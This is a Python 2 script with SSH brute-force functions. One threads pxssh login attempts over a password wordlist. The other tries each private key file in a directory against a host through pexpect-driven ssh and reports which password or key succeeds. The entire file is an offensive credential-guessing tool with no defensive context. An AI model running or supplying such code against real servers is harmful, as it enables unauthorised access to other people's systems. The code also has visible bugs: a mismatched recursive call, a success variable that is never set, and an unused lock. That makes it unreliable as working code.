#!/usr/bin/python

import pxssh
import optparse
import time
import pexpect
import os
from threading import *

maxConnections = 5
Found = False
Fails = 0
connection_lock = None
NUM_THREADS = 0

def connect(host, user, password):
	global Found
	global Fails
	global connection_lock
	global NUM_THREADS
	
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password cracked: ' + password
		Found = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password)
#	finally:
		#connection_lock.acquire()
		#connection_lock.release()
		
def connect_with_key(user, host, keyfile, port):
	global Stop
	global Fails
	perm_denied = 'Permission denied'
	ssh_newkey = 'Are you sure you want to continue'
	conn_closed = 'Connection closed by remote host'
	opt = ' -o PasswordAuthentication=no'
	connStr = 'ssh -p ' + str(port) + ' ' + user + '@' + host +' -i ' + keyfile + opt
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
	if ret == 2:
		print '[-] Adding Host to ~/.ssh/known_hosts'
		child.sendline('yes')
		connect(user, host, keyfile, False)
	elif ret == 3:
		print '[-] Connection Closed By Remote Host'
		Fails += 1
	elif ret > 3:
		print '[+] Success. ' +str(keyfile)
		Stop = True

def sshBrute(host, user, fn, port):
	global Found
	global Fails
	global connection_lock
	global NUM_THREADS
	connection_lock = BoundedSemaphore(value=maxConnections)
	Found = False
	Fails = 0
	PASSWORD = ''
	NUM_THREADS = 0
	
	for line in fn.readlines():
		if Found:
			print "[+] Exiting: Password Found: " + PASSWORD
			return
		if Fails > 5:
			print "[!] Exiting: Too Many Socket Timeouts"
			return
		password = line.strip('\r').strip('\n')
		print "[*] Testing: " + password
		t = Thread(target=connect, args=(host, user, password))
		child = t.start()
	t.join()

def bruteKey(host, user, port, passDir):
	global connection_lock
	global Stop
	global Fails
	global maxConnections
	connection_lock = BoundedSemaphore(value=maxConnections)
	Stop =  False
	Fails =  0

	for filename in os.listdir(passDir):
		if Stop:
			print '[*] Exiting: Key Found.'
			return
		if Fails > 5:
			print '[!] Exiting: Too Many Connections Closed By Remote Host.'
			print '[!] Adjust number of simultaneous threads.'
			return
		fullpath = os.path.join(passDir, filename)
		print '[-] Testing keyfile ' + str(fullpath)
		t = Thread(target=connect_with_key,args=(user, host, fullpath, port))
		child = t.start()
	t.join()